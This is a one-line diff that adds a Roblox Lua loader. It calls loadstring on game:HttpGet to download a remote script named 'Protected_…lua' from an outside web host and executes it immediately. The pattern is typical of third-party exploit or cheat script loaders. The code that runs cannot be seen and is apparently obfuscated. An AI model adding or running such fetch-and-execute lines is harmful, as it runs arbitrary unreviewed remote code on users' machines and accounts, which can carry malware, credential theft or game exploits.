@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://www.eskeyz.my.id/Protected_4877699240149479.lua",true))()
